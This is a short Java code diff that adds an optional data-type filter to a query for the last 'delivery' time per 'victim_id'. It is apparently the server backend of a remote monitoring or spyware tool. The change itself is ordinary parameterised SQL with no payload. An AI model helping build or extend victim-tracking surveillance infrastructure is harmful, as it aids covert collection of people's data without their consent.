@@ -1,5 +1,6 @@
 package com.theah64.xrob.api.database.tables;
 
+import com.sun.istack.internal.Nullable;
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.utils.clientpanel.TimeUtils;
@@ -77,8 +78,12 @@ public class Deliveries extends BaseTable<Delivery> {
         return getV2(TABLE_NAME_DELIVERIES, byColumn, byValues, columnToReturn);
     }
 
-    public String getLastDeliveryTime(String theVictimId) {
-        final String query = "SELECT UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id = ? ORDER BY id DESC LIMIT 1";
+    public String getLastDeliveryTime(@Nullable final String type, String theVictimId) {
+        String query = "SELECT UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id = ?";
+        if (type != null) {
+            query += " AND data_type =?";
+        }
+        query += " ORDER BY id DESC LIMIT 1 ";
 
         String relativeTime = null;
         final java.sql.Connection con = Connection.getConnection();
@@ -86,6 +91,9 @@ public class Deliveries extends BaseTable<Delivery> {
         try {
             final PreparedStatement ps = con.prepareStatement(query);
             ps.setString(1, theVictimId);
+            if (type != null) {
+                ps.setString(2, type);
+            }
             final ResultSet rs = ps.executeQuery();
 
             if (rs.first()) {
